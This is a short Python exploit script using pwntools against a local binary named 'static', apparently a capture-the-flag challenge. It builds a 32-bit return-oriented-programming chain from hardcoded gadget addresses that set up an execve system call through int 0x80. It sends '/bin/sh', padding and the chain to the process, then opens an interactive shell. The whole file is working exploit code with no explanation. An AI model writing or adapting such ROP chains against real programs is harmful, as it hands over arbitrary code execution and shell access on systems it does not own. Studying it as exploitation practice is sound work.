from pwn import *

p = process('./static')
# gdb.attach(p, gdbscript = 'b *do_assemble')


pause()
eax2edi = p32(0x0806af9d)
pushJunk = p32(0x08048b12)
edi2edx = p32(0x0809c216) # includes 3 pops
edx2ebx = p32(0x0806d956) 
popInedi = p32(0x08049aab)
edi2eax = p32(0x08064384)
pushEbx = p32(0x0808d3aa)
popEdi = p32(0x08049aab)
edi2edx = p32(0x0809c216) # includes 3 pops
xorEcxAndInt80 = p32(0x0806ef51)


payload = (
    eax2edi +
    edi2edx + p32(0xfffff001-1)*3 +
    edx2ebx +
    popInedi + p32(11) + 
    edi2eax + p32(0) +
    popEdi + p32(0) + 
    edi2edx + 'adam'*3 +
    xorEcxAndInt80
    )


p.recv()
p.sendline('/bin/sh\0'+'A'*8
        +payload)
p.interactive()
